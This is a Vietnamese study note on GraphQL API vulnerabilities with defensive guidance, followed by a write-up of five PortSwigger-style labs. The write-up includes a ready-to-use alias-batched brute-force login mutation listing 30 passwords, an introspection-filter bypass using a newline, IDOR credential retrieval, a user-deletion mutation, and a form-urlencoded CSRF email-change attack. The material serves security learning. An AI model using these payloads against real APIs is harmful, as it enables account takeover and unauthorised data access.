graphql
query{__typename}
```

Nếu endpoint đúng là GraphQL, response thường trả về tên kiểu hiện tại, ví dụ:

```json
{"data":{"__typename":"query"}}
```

Universal query này rất hữu ích vì:
- ngắn;
- ít phụ thuộc schema cụ thể;
- thường hoạt động ngay cả khi schema không được công khai đầy đủ.

### Common endpoint names

Khi chưa có dấu hiệu rõ ràng, hãy thử những tên endpoint phổ biến nêu trên. Nhiều lab và ứng dụng thật đặt GraphQL ở một trong các vị trí đó. Tuy nhiên, cũng cần lưu ý rằng một số ứng dụng dùng endpoint không điển hình hoặc lồng GraphQL vào trong một đường dẫn dường như không liên quan.

### Request methods

Một số GraphQL endpoint chấp nhận `POST`, một số chấp nhận cả `GET`, và đôi khi còn chấp nhận nhiều kiểu mã hóa dữ liệu khác nhau. Việc endpoint có chấp nhận `GET` hay `application/x-www-form-urlencoded` đặc biệt quan trọng vì nó có thể ảnh hưởng trực tiếp tới khả năng khai thác CSRF.

### Initial testing

Trong giai đoạn test ban đầu, bạn nên thử:
- gửi universal query bằng `POST` JSON;
- thử lại bằng `GET` nếu endpoint có vẻ phản hồi query qua URL;
- thay đổi `Content-Type`;
- xem endpoint có trả về lỗi kiểu GraphQL hay không.

Một thông báo lỗi như “Query not present” có thể là dấu hiệu rất mạnh cho thấy server đang mong đợi một GraphQL query.

## Exploiting unsanitized arguments

Đây là một trong những nhóm lỗi quan trọng nhất của GraphQL API. Nếu user-supplied arguments được dùng trực tiếp để truy cập object, API có thể dễ dàng dính lỗi access control. Ví dụ:
- query nhận `id` để lấy user;
- mutation nhận `postId` để sửa bài viết;
- query nhận `slug` để lấy bài viết riêng tư.

Nếu backend không ràng buộc giá trị đó với người dùng hiện tại hoặc với phạm vi dữ liệu mà user được phép truy cập, attacker có thể thay giá trị đầu vào để lấy dữ liệu hoặc thay đổi object của người khác.

PortSwigger có các lab minh họa rất rõ kiểu lỗi này. Có trường hợp attacker chỉ cần thay `id` để lấy credential fields của administrator. Có trường hợp chỉ cần thêm một field riêng tư vào query để lấy password của một bài blog ẩn. Điểm chung là backend đã tin rằng client “sẽ chỉ yêu cầu thứ mà frontend dùng”, trong khi với GraphQL, client hoàn toàn có thể tự viết query của mình.

Ngoài access control, unsanitized arguments còn có thể làm phát sinh những vấn đề khác tùy cách backend sử dụng đầu vào. Nếu argument được đưa vào logic truy vấn, filter, tìm kiếm hoặc resolver phức tạp mà không kiểm soát tốt, nó có thể tạo ra các lỗi logic nghiêm trọng hoặc mở đường cho những kiểu injection ở lớp dưới.

## Discovering schema information

Khám phá schema là trọng tâm của việc pentest GraphQL. Nếu không biết schema, attacker vẫn có thể thử mù, nhưng hiệu quả thấp hơn nhiều. Nếu biết schema, attacker có thể nhanh chóng tìm ra những field và mutation đáng giá nhất.

### Using introspection

Nếu introspection được bật, attacker có thể gửi introspection query để lấy cấu trúc schema. Thông tin này thường bao gồm:
- danh sách type;
- danh sách query và mutation;
- field của từng type;
- argument của từng field;
- kiểu trả về.

Đây là kỹ thuật schema discovery mạnh nhất vì nó cung cấp thông tin có cấu trúc và gần như hoàn chỉnh.

### Probing for introspection

Ngay cả khi introspection không bật rõ ràng, vẫn có thể kiểm tra xem nó có bị chặn thật sự hay không bằng cách gửi các truy vấn liên quan tới `__schema` hoặc `__type`. Một số hệ thống chỉ chặn hời hợt và vẫn vô tình để lộ một phần phản hồi hoặc lỗi có ích.

### Running a full introspection query

Khi introspection hoạt động, có thể gửi full introspection query để thu về toàn bộ schema hoặc phần lớn schema. Trong thực tế, Burp Suite hỗ trợ tạo introspection query tự động, giúp quá trình này nhanh hơn.

### Visualizing introspection results

Sau khi thu được kết quả introspection, việc trực quan hóa schema rất hữu ích. Một schema lớn với nhiều type lồng nhau có thể khó đọc nếu chỉ nhìn JSON thô. Khi được hiển thị dưới dạng cây hoặc sơ đồ, pentester dễ nhận ra:
- field nhạy cảm;
- mutation đáng chú ý;
- object nào có ID hoặc quan hệ trực tiếp;
- đâu là điểm nên thử access control bypass.

### Suggestions

Nhiều GraphQL server đưa ra gợi ý khi bạn nhập sai tên field hoặc query. Ví dụ, nếu bạn gõ gần đúng tên field, response lỗi có thể gợi ý field thật sự tồn tại. Đây là một nguồn schema discovery cực kỳ hữu ích khi introspection bị tắt. Chỉ cần thử các tên gần đúng, attacker có thể dần dần khôi phục cấu trúc schema.

## Bypassing GraphQL introspection defenses

Nhiều hệ thống cho rằng chỉ cần tắt introspection là đã đủ an toàn. Trên thực tế, điều đó không đúng. Nếu server vẫn để lộ quá nhiều thông tin qua error message, gợi ý field, hành vi phản hồi khác nhau giữa các query, hoặc những điểm sơ hở trong việc lọc keyword, attacker vẫn có thể suy ra schema.

Một số hệ thống chỉ chặn một định dạng request hoặc chỉ chặn những introspection query phổ biến. Khi đó, attacker có thể thay đổi cách biểu diễn query, chia nhỏ truy vấn, hoặc khai thác error-based discovery để lách biện pháp phòng thủ.

Điểm quan trọng cần nhớ là: **khóa introspection không làm biến mất nhu cầu bảo vệ access control**. Ngay cả khi attacker không đọc được toàn bộ schema, nếu backend cho phép truy cập trái phép object hoặc field, GraphQL API vẫn bị khai thác.

## Bypassing rate limiting using aliases

Aliases là một tính năng hợp pháp nhưng cũng rất dễ bị lợi dụng. Nếu hệ thống chống brute force hoặc rate limiting chỉ đếm số lượng HTTP request gửi tới server, attacker có thể nhét rất nhiều lần thử vào trong một request GraphQL duy nhất.

Ví dụ, trong bài toán brute force login, attacker có thể tạo một request chứa nhiều alias của mutation đăng nhập. Mỗi alias dùng cùng username nhưng khác password. Từ góc nhìn của proxy hoặc firewall, đó vẫn là một request. Nhưng ở tầng GraphQL, server phải xử lý nhiều lần thử đăng nhập độc lập.

Khi cơ chế giới hạn không được áp ở mức operation hoặc logic nghiệp vụ, aliases có thể giúp attacker bypass brute-force protection. Đây là một trong những khác biệt rõ rệt giữa pentest GraphQL và pentest REST: cùng một request có thể mang nhiều hành động hơn rất nhiều so với suy nghĩ ban đầu.

## GraphQL CSRF

GraphQL mutation hoàn toàn có thể bị CSRF nếu endpoint được thiết kế theo cách mà trình duyệt có thể gửi request xuyên site. Một số người nhầm rằng GraphQL an toàn hơn trước CSRF vì thường dùng JSON POST, nhưng điều này chỉ đúng khi endpoint thực sự **chỉ** chấp nhận JSON POST và có kiểm tra phù hợp.

Nếu GraphQL endpoint chấp nhận:
- `GET` với query trong URL;
- hoặc `POST` với `application/x-www-form-urlencoded`;
- hoặc không xác minh chặt chẽ `Content-Type`;
thì attacker có thể dựng trang exploit để trình duyệt nạn nhân gửi mutation ngoài ý muốn.

Mutation đổi email là ví dụ rất điển hình. Nếu endpoint chấp nhận request theo định dạng mà trình duyệt tự gửi được, attacker có thể tạo một form ẩn hoặc một trang tự submit để đổi email của nạn nhân mà không cần họ biết.

Do đó, GraphQL không làm biến mất CSRF. Nếu mutation thay đổi trạng thái, bạn vẫn phải áp dụng tư duy phòng thủ y hệt như với các API khác.

## Preventing GraphQL attacks

Phòng thủ với GraphQL không phải là vô hiệu hóa một tính năng duy nhất. Nó đòi hỏi nhiều lớp kiểm soát song song.

### Kiểm soát lộ schema

Không nên để introspection mở rộng rãi trên production nếu không thực sự cần. Nếu phải dùng introspection, nên giới hạn ai được truy cập và giảm lượng thông tin bị lộ qua error message. Không nên để server đưa ra gợi ý quá hào phóng về field, query hoặc type trong môi trường production.

### Kiểm soát quyền phía server

Đây là phần quan trọng nhất. Mọi query, mutation, object và field nhạy cảm đều phải được kiểm tra quyền ở phía server. Không nên tin rằng frontend sẽ chỉ yêu cầu dữ liệu “đúng mục đích”. Với GraphQL, client hoàn toàn có thể tự viết query riêng. Nếu backend không kiểm tra quyền, attacker sẽ sớm khai thác được.

### Kiểm soát complexity và operation limits

GraphQL cho phép query rất linh hoạt, nên cần áp giới hạn như:
- số field tối đa;
- số alias tối đa;
- số root field tối đa;
- độ sâu truy vấn;
- kích thước tối đa của query.

Việc áp **operation limits** giúp giảm cả nguy cơ DoS lẫn nguy cơ lạm dụng aliases để brute force. Ngoài ra, có thể triển khai **cost analysis** để ước tính chi phí xử lý của mỗi query và từ chối các truy vấn quá nặng.

### Phòng chống brute force

Không nên giới hạn chỉ ở mức request HTTP. Cần phát hiện và giới hạn ở mức operation thực tế. Nếu không, aliases sẽ phá vỡ giả định của hệ thống. Các mutation nhạy cảm như login nên được kiểm soát theo user, theo IP, theo số lần thử thất bại và theo logic nghiệp vụ thực tế.

### Phòng chống CSRF

Đối với GraphQL CSRF, cần đảm bảo ít nhất những điều sau:
- API chỉ chấp nhận query qua JSON-encoded POST;
- server xác minh nội dung gửi lên có đúng với `Content-Type` khai báo;
- mutation nhạy cảm được bảo vệ bằng CSRF token cơ chế an toàn.

Nếu endpoint chấp nhận `GET` hoặc `x-www-form-urlencoded` một cách không cần thiết, bề mặt CSRF sẽ tăng lên đáng kể.

### Giảm thông tin trong lỗi

Error message nên đủ hữu ích cho vận hành nhưng không nên giúp attacker khám phá schema quá dễ. Các thông báo kiểu “Did you mean...?” hoặc những lỗi tiết lộ tên field, type, mutation có thể rất có giá trị trong tay attacker.

## Tóm tắt

GraphQL API vulnerabilities thường đến từ sự kết hợp giữa tính linh hoạt mạnh mẽ của GraphQL và việc bảo vệ không tương xứng ở phía server. Những rủi ro quan trọng nhất cần nhớ là:
- endpoint GraphQL có thể bị lộ hoặc dễ tìm;
- schema có thể bị khám phá qua introspection hoặc error message;
- arguments và variables do user kiểm soát có thể dẫn tới IDOR hoặc các lỗi access control khác;
- aliases có thể bị lợi dụng để bypass rate limit và brute-force protection;
- mutation vẫn có thể bị CSRF;
- field riêng tư có thể bị lộ nếu backend tin rằng frontend sẽ không yêu cầu chúng.

Nói ngắn gọn, GraphQL không nguy hiểm hơn REST một cách mặc định, nhưng khi schema, access control và validation không được thiết kế cẩn thận, attacker có thể khai thác GraphQL rất hiệu quả chỉ qua một số ít endpoint.

# WU

<!-- TOC -->
## Mục lục

  - [Common endpoint names](#common-endpoint-names)
  - [Request methods](#request-methods)
  - [Initial testing](#initial-testing)
- [Exploiting unsanitized arguments](#exploiting-unsanitized-arguments)
- [Discovering schema information](#discovering-schema-information)
  - [Using introspection](#using-introspection)
  - [Probing for introspection](#probing-for-introspection)
  - [Running a full introspection query](#running-a-full-introspection-query)
  - [Visualizing introspection results](#visualizing-introspection-results)
  - [Suggestions](#suggestions)
- [Bypassing GraphQL introspection defenses](#bypassing-graphql-introspection-defenses)
- [Bypassing rate limiting using aliases](#bypassing-rate-limiting-using-aliases)
- [GraphQL CSRF](#graphql-csrf)
- [Preventing GraphQL attacks](#preventing-graphql-attacks)
  - [Kiểm soát lộ schema](#kiểm-soát-lộ-schema)
  - [Kiểm soát quyền phía server](#kiểm-soát-quyền-phía-server)
  - [Kiểm soát complexity và operation limits](#kiểm-soát-complexity-và-operation-limits)
  - [Phòng chống brute force](#phòng-chống-brute-force)
  - [Phòng chống CSRF](#phòng-chống-csrf)
  - [Giảm thông tin trong lỗi](#giảm-thông-tin-trong-lỗi)
- [Tóm tắt](#tóm-tắt)
- [Accessing private GraphQL posts](#accessing-private-graphql-posts)
- [Accidents exposure private graphQL fields](#accidents-exposure-private-graphql-fields)
- [Finding a hidden GraphQL endpoint](#finding-a-hidden-graphql-endpoint)
- [Bypassing GraphQL brute force protections](#bypassing-graphql-brute-force-protections)
- [Performing CSRF exploits over GraphQL](#performing-csrf-exploits-over-graphql)
<!-- /TOC -->
- [x] Accessing private GraphQL posts
- [x] Accidental exposure of private GraphQL fields
- [x] Finding a hidden GraphQL endpoint
- [x] Bypassing GraphQL brute force protections
- [x] Performing CSRF exploits over GraphQL

## Accessing private GraphQL posts

- khi truy cập web và vào blog bất kỳ, ta sẽ thấy ở burp request GraphQL để lấy danh sách bài viết
![](../../image/Pasted%20image%2020260513135831.png)


![](../../image/Pasted%20image%2020260513135822.png)

![](../../image/Pasted%20image%2020260513141941.png)

response trả về
- mỗi bài có `id`,
- các `id` tăng tuần tự,
- nhưng thiếu `id=3`.

- chạy introspection để xem schema
![](../../image/Pasted%20image%2020260513143509.png)
![](../../image/Pasted%20image%2020260513143532.png)
 thấy có 1 field là postPassword , trên frontend của blogpost ko hiển thị nhưng  schema vẫn khai báo và API vẫn cho phép truy vấn

- gửi lại request vào repeater, ở tab graphQL, thêm field postPassword vào và sửa id thành 3
![](../../image/Pasted%20image%2020260513144620.png)

## Accidents exposure private graphQL fields

- thử login vào tài khoản, request đăng nhập sẽ đi qua một **GraphQL mutation** chứa `username` và `password`
![](../../image/Pasted%20image%2020260513151053.png)

- tiến hành set introspection và gửi request, sau đó save to sitemap
- ở tab sitemap, ta sẽ phát hiện 1 query là `getUser`, 
	- trả về `username`,
	- trả về `password`,
	- và lấy dữ liệu dựa trên tham chiếu trực tiếp tới một `id`.
![](../../image/Pasted%20image%2020260513152035.png)
Đây chính là lỗ hổng của bài:
- API không nên trả field `password`,
- lại còn cho chọn user bằng `id`,
- nên attacker có thể duyệt `id` để lấy credential của user khác

- thử id = 1 và gửi tới repeater
![](../../image/Pasted%20image%2020260513152304.png)

## Finding a hidden GraphQL endpoint

- dùng intruder để quét qua 1 loại các api ở website
![](../../image/Pasted%20image%2020260513154751.png)
thấy chỉ có /api là trả vè 400

![](../../image/Pasted%20image%2020260513154830.png)

- có thể đây là endpoint của 1 graphQL đang chờ query 
- vì đây là method GET nên query phải chèn trong api như 1 param
![](../../image/Pasted%20image%2020260513155430.png)

- khi thêm introspection vào reqeust thì response phản hồi cho thấy lab có cơ chế phòng vệ
![](../../image/Pasted%20image%2020260513163534.png)
- để bypass filter, cần **bypass filter** bằng cách thêm **newline ngay sau `__schema`** nghĩa là xuống dòng trước dấu {
![](../../image/Pasted%20image%2020260513163817.png)
bằng cách thêm %0a vào sau scheme ở request

![](../../image/Pasted%20image%2020260513164045.png)

- thấy có mutation deleteOrganizationUser
![](../../image/Pasted%20image%2020260513164233.png)
gọi mutation này và id = 3 để xóa carlos

## Bypassing GraphQL brute force protections
- bắt request login ở burp
![](../../image/Pasted%20image%2020260514233729.png)

- thử lồng nhiều tài khoản mật khẩu vào trong data JSON
{
  "operationName": "login",
  "query": "mutation login { login0: login(input: { username: \"carlos\", password: \"123456\" }) { token success } login1: login(input: { username: \"carlos\", password: \"password\" }) { token success } }"
}

![](../../image/Pasted%20image%2020260514234718.png)

- thấy response trả về như hình chứng tỏ server xử lí nhiều lần login trong 1 reqeust
- giờ cần mở rộng payload ra toàn bộ password, danh scash đã được lab cung cấp

```
{
  "query": "mutation { login0: login(input: { username: \"carlos\", password: \"123456\" }) { token success } login1: login(input: { username: \"carlos\", password: \"password\" }) { token success } login2: login(input: { username: \"carlos\", password: \"12345678\" }) { token success } login3: login(input: { username: \"carlos\", password: \"qwerty\" }) { token success } login4: login(input: { username: \"carlos\", password: \"123456789\" }) { token success } login5: login(input: { username: \"carlos\", password: \"12345\" }) { token success } login6: login(input: { username: \"carlos\", password: \"1234\" }) { token success } login7: login(input: { username: \"carlos\", password: \"111111\" }) { token success } login8: login(input: { username: \"carlos\", password: \"1234567\" }) { token success } login9: login(input: { username: \"carlos\", password: \"dragon\" }) { token success } login10: login(input: { username: \"carlos\", password: \"123123\" }) { token success } login11: login(input: { username: \"carlos\", password: \"baseball\" }) { token success } login12: login(input: { username: \"carlos\", password: \"abc123\" }) { token success } login13: login(input: { username: \"carlos\", password: \"football\" }) { token success } login14: login(input: { username: \"carlos\", password: \"monkey\" }) { token success } login15: login(input: { username: \"carlos\", password: \"letmein\" }) { token success } login16: login(input: { username: \"carlos\", password: \"shadow\" }) { token success } login17: login(input: { username: \"carlos\", password: \"master\" }) { token success } login18: login(input: { username: \"carlos\", password: \"666666\" }) { token success } login19: login(input: { username: \"carlos\", password: \"qwertyuiop\" }) { token success } login20: login(input: { username: \"carlos\", password: \"123321\" }) { token success } login21: login(input: { username: \"carlos\", password: \"mustang\" }) { token success } login22: login(input: { username: \"carlos\", password: \"1234567890\" }) { token success } login23: login(input: { username: \"carlos\", password: \"michael\" }) { token success } login24: login(input: { username: \"carlos\", password: \"654321\" }) { token success } login25: login(input: { username: \"carlos\", password: \"superman\" }) { token success } login26: login(input: { username: \"carlos\", password: \"1qaz2wsx\" }) { token success } login27: login(input: { username: \"carlos\", password: \"7777777\" }) { token success } login28: login(input: { username: \"carlos\", password: \"121212\" }) { token success } login29: login(input: { username: \"carlos\", password: \"000000\" }) { token success } }"
}
```

![](../../image/Pasted%20image%2020260514234913.png)

- kết quả true của login7 tức là password: 111111
![](../../image/Pasted%20image%2020260514235011.png)

## Performing CSRF exploits over GraphQL

- sau khi login và thử đổi mật khẩu, thấy request đổi mật khẩu là 1 graphQL mutation
![](../../image/Pasted%20image%2020260515001801.png)

Bình thường GraphQL hay gửi JSON với `Content-Type: application/json`. Kiểu này khó tạo CSRF bằng form HTML thuần hơn. Nhưng trong lab này, endpoint lại chấp nhận body dạng form-urlencoded:
```
Content-Type: application/x-www-form-urlencoded
```
Vì vậy attacker có thể tạo form HTML chứa các field:
```
query
operation
Namevariables
```
Khi nạn nhân mở trang exploit, trình duyệt tự submit form đến endpoint GraphQL, kèm cookie session của nạn nhân. Nếu server không có CSRF token hoặc kiểm tra Origin/SameSite phù hợp, mutation đổi email sẽ được thực thi.
- chuột phải chọn ấn change methrod request 2 lần để request sang POST
-
- body cần thêm theo dạng url encode:
```
query=<url-encoded-graphql-query>&operationName=changeEmail&variables=<url-encoded-json-variables>
```
![](../../image/Pasted%20image%2020260515002540.png)![](../../image/Pasted%20image%2020260515002615.png)

- sau khi thêm query xong, sinh PoC CSRF và deliver to victime trên exploit server
- Khi victim mở exploit, form sẽ tự submit mutation đổi email bằng cookie của victim, và lab được solve.